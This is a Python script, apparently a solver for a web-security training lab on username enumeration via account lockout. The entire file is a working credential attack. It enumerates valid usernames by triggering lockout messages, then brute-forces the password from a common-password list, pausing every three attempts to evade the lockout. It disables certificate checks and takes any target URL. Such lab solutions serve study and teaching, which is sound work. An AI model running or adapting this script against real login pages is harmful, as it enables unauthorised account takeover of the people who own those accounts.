import os
import importlib.resources as pkg_resources
from pathlib import Path
import pkgutil
import requests
import urllib3
import re
import time
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Username enumeration via account lock"
SCRIPT_START_TIME = time.time()


def read_list(filename):
    try:
        # Try local read (for development)
        with open(filename, 'rt', encoding='utf-8') as f:
            return f.read().splitlines()
    except FileNotFoundError:
        try:
            # Fallback for installed package (pip)
            data = pkgutil.get_data("burplabs", f"labs/{filename}")
            return data.decode().splitlines()
        except Exception as e:
            print(Fore.RED + f"[!] Failed to read {filename}: {e}")
            exit(1)


def print_progress(counter, total_counts, text):
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + "Elapsed: " + Fore.YELLOW + str(elapsed) +
          Fore.WHITE + f" seconds || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message():
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + "\n[+] Finished in: " +
          Fore.YELLOW + str(elapsed) + Fore.WHITE + " seconds")


def login(session, username, password, url):
    data = {"username": username, "password": password}
    try:
        return session.post(f"{url}/login", data=data, allow_redirects=False)
    except:
        print(Fore.RED + f"\n[!] Failed to login as {username}")
        return None


def text_exist_in_response(pattern, response):
    return bool(re.search(pattern, response.text))


def try_to_find_valid_username(session, usernames_list, url):
    total_users = len(usernames_list)

    for try_number in range(4):
        print(Fore.WHITE + f"⦗*⦘ Try number: " + Fore.BLUE +
              str(try_number + 1) + Fore.WHITE + f" of {total_users} usernames..")

        for counter, user in enumerate(usernames_list):
            print_progress(counter, total_users, user)
            response = login(session, user, "not_important", url)

            if response and response.status_code == 200:
                if "too many incorrect login attempts" in response.text:
                    print(Fore.GREEN +
                          f"\n🗹 Valid username identified: {user}")
                    return user

    print(Fore.RED + "⦗!⦘ No valid username was found")
    exit(1)


def brute_force_password(session, valid_user, passwords, url):
    total_passwords = len(passwords)

    for counter, password in enumerate(passwords):
        if counter % 3 == 0:
            print(Fore.WHITE + "\n⦗*⦘ Waiting 60 seconds to bypass blocking..")
            time.sleep(60)

        print_progress(counter, total_passwords, password)
        response = login(session, valid_user, password, url)

        if response and response.status_code == 302:
            session_cookie = response.cookies.get("session")
            session.cookies.set("session", session_cookie)
            print(Fore.GREEN + f"\n🗹 Valid password found: {password}")
            return password

    print(Fore.RED + "⦗!⦘ No valid password was found")
    exit(1)


def run(url, payload, proxies=None):
    url = url.rstrip('/')
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Read usernames and passwords lists\n2. Try all users multiple times until on account is locked\n3. Brute force password of that valid username (wait 1 minute every 3 password tries to bypass blocking)\n4. Login with the valid credentials\n""")

    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    usernames_list = [
        "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator",
        "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser", "academico", "acceso",
        "access", "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin", "administracion",
        "administrador", "administrator", "administrators", "admins", "ads", "adserver", "adsl", "ae", "af",
        "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai", "al",
        "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an",
        "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app",
        "app01", "app1", "apple", "application", "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight",
        "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena", "atlanta",
        "atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover"
    ]

    password_list = [
        "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop",
        "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000",
        "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
        "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert",
        "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle",
        "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie",
        "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole",
        "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor",
        "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"
    ]

    print(Fore.WHITE + "[1] Reading usernames list..")
    print(Fore.GREEN + "usernames stored")

    print(Fore.WHITE + "[2] Reading password list..")
    print(Fore.GREEN + "passwords stored")
    print(Fore.WHITE + "This is long lab, be patience")

    print(Fore.WHITE + "[3] Finding valid username")
    valid_user = try_to_find_valid_username(session, usernames_list, url)
    print(Fore.WHITE + "\nValid username: " + Fore.GREEN + valid_user)

    print(Fore.WHITE + "[4] Brute forcing password..")
    valid_password = brute_force_password(
        session, valid_user, password_list, url)

    print(Fore.WHITE + "\nValid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "Valid password: " + Fore.GREEN + valid_password)

    print(Fore.WHITE + "[5] Logging in.. ", end="", flush=True)

    try:
        r = session.get(f"{url}/my-account", allow_redirects=False)
        if "Your username is: " in r.text:
            print_finish_message()
            return True
        else:
            print(Fore.RED + "Login session failed.")
            return False
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        return False
